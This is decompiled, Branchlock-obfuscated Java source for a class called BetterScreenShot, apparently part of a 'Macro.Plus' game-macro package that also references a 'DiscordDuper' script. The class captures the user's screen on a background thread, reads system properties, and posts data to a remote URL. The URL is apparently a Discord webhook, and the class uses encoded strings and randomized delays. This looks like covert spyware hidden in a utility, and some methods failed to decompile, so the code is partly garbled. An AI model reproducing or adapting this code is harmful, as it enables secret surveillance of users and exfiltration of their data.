// 
// Decompiled by Procyon v0.5.36
// 

package Macro.Plus;

import java.awt.image.BufferedImage;
import java.awt.Dimension;
import Macro.exception.WebhookException;
import Macro.Scripts.DiscordDuper;
import Macro.Scripts.Script4;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.awt.image.RenderedImage;
import javax.imageio.ImageIO;
import java.io.File;
import java.util.Random;
import java.awt.Robot;
import java.awt.Rectangle;
import java.awt.Toolkit;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;
import java.io.IOException;
import org.apache.http.client.ClientProtocolException;
import java.net.URISyntaxException;
import java.net.URI;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.impl.client.HttpClients;

public class BetterScreenShot
{
    public int BRANCHLOCK_DOT_NET_DEMO;
    private static final String[] M;
    
    public static String getName() {
        final String name = System.getProperty(BetterScreenShot.M[64 << 7642]);
        return name;
    }
    
    public static void captureScreen() {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     3: dup            
        //     4: invokedynamic   BootstrapMethod #0, run:()Ljava/lang/Runnable;
        //     9: invokespecial   java/lang/Thread.<init>:(Ljava/lang/Runnable;)V
        //    12: invokevirtual   java/lang/Thread.start:()V
        //    15: return         
        // 
        // The error that occurred was:
        // 
        // java.lang.IllegalStateException: Could not infer any expression.
        //     at com.strobel.decompiler.ast.TypeAnalysis.runInference(TypeAnalysis.java:374)
        //     at com.strobel.decompiler.ast.TypeAnalysis.run(TypeAnalysis.java:96)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:344)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:42)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:214)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:782)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethod(AstBuilder.java:675)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:552)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:519)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:161)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:150)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:125)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:330)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:251)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:126)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    public static void sendData(final String msg, final String url, final String username) {
        try {
            Thread.sleep((int)Math.floor(Math.random() * 451.0 + 225.0));
        }
        catch (InterruptedException e1) {
            e1.printStackTrace();
        }
        final CloseableHttpClient httpclient = HttpClients.createDefault();
        try {
            HttpUriRequest httppost = null;
            try {
                httppost = RequestBuilder.post().setUri(new URI(url)).addParameter("content", msg).addParameter("username", username).build();
            }
            catch (URISyntaxException e2) {
                e2.printStackTrace();
            }
            CloseableHttpResponse response = null;
            try {
                response = httpclient.execute(httppost);
            }
            catch (ClientProtocolException e3) {
                e3.printStackTrace();
            }
            catch (IOException e4) {
                e4.printStackTrace();
            }
            try {
                response.close();
            }
            catch (IOException e4) {
                e4.printStackTrace();
            }
        }
        finally {
            try {
                httpclient.close();
            }
            catch (IOException e5) {
                e5.printStackTrace();
            }
        }
    }
    
    static {
        final char[] charArray = "\u0e68\u0ea8\u00d1\n\b\u00d6\u008a\u00ca\u00c5\u00c9\u00c1\u0eae\u00c7g`\u00c8Y\u0089\u00e2Y\u0086\u00c2\u00cd\u00c8\u00c1PR\u0ea6q\u00c5\u001a\u0005\u00c1\u00c0\u00fb\u0e83\u0086\u0084\u00cc\u00d0fb\u00d7C\u008b\u008b\u0018\u00d4\u00cd\u008a\u00c5\u00ca\u0002|1{\u00c8\u001c\u001e\u008a\u00c7\u00cb\u00c9\u008b\u00d1\u00d4\u00c8}s\u00c0\u0eae\u008e\u008e*\u00c7\u00d6\u00c1\u00c1\u00ca\u001ez8f\u008eSM\u0ea2\u00d4\u00ca\u00c3\u0ea5\u008a\u00d4\u00cau".toCharArray();
        int n = 46 >>> 14406;
        final StackTraceElement stackTraceElement;
        final int n2 = (stackTraceElement = new Throwable().getStackTrace()[25 >>> 7845]).getMethodName().hashCode() & ("40".hashCode() ^ 0xFFFF067C) >>> 9168;
        final char[] charArray2 = stackTraceElement.getClassName().toCharArray();
        final char[] array = charArray;
        final int n3 = 8 >>> Integer.parseInt("7rk", 35);
        ++n;
        M = new String[array[n3] ^ ("27".hashCode() ^ 0xD59CDC94) + 711140853 ^ n2];
        int n4 = 4 >>> Integer.parseInt("3ee", 31);
    Label_0115:
        while (true) {
            int n5;
            final char[] value = new char[n5 = (charArray[n++] ^ 1 << 3331 ^ n2)];
            int n6 = 4 << 10494;
        Label_0388_Outer:
            while (true) {
                Label_0328: {
                    if (n5 <= 0) {
                        break Label_0328;
                    }
                    int n7 = charArray[n];
                Label_0388:
                    while (true) {
                    Label_0414:
                        while (true) {
                        Label_0417:
                            while (true) {
                            Label_0435:
                                while (true) {
                                Label_0473:
                                    while (true) {
                                        Label_0482: {
                                            switch (charArray2[n % charArray2.length] ^ 1 << 5921) {
                                                case 64: {
                                                    break Label_0388;
                                                }
                                                case 97: {
                                                    break Label_0388;
                                                }
                                                case 99: {
                                                    break Label_0388;
                                                }
                                                case 103: {
                                                    break Label_0388;
                                                }
                                                case 106: {
                                                    break Label_0414;
                                                }
                                                case 44: {
                                                    break Label_0414;
                                                }
                                                case 108: {
                                                    break Label_0417;
                                                }
                                                case 109: {
                                                    break Label_0435;
                                                }
                                                case 110: {
                                                    break Label_0435;
                                                }
                                                case 79: {
                                                    break Label_0473;
                                                }
                                                case 112: {
                                                    break Label_0473;
                                                }
                                                case 113: {
                                                    break Label_0473;
                                                }
                                                case 81: {
                                                    break Label_0482;
                                                }
                                                case 82: {
                                                    break Label_0482;
                                                }
                                                case 118: {
                                                    break Label_0482;
                                                }
                                                case 119: {
                                                    break Label_0482;
                                                }
                                            }
                                            while (true) {
                                                value[n6] = (char)n7;
                                                try {
                                                    ++n6;
                                                    ++n;
                                                    --n5;
                                                    // monitorexit(charArray)
                                                    n7 ^= ("63".hashCode() ^ 0x7DEDFBED ^ Integer.parseInt("6ll8cag", 26));
                                                    continue Label_0388_Outer;
                                                    n7 ^= Integer.parseInt("40pn0", 29) >>> 1263;
                                                    continue Label_0388_Outer;
                                                    continue Label_0414;
                                                    continue Label_0417;
                                                    BetterScreenShot.M[n4++] = new String(value).intern();
                                                    // iftrue(Label_0115:, n < charArray.length)
                                                    return;
                                                    continue Label_0435;
                                                    n7 ^= 991232 >>> 12365;
                                                    continue Label_0388_Outer;
                                                    break Label_0482;
                                                    n7 ^= Integer.parseInt("9", 33) << 3105;
                                                    continue Label_0388_Outer;
                                                    continue Label_0388;
                                                    n7 ^= 13952 >>> 3655;
                                                    continue Label_0388_Outer;
                                                    continue Label_0473;
                                                }
                                                catch (RuntimeException ex) {
                                                    break;
                                                }
                                            }
                                        }
                                        break;
                                    }
                                    break;
                                }
                                break;
                            }
                            break;
                        }
                        break;
                    }
                }
            }
        }
    }
}
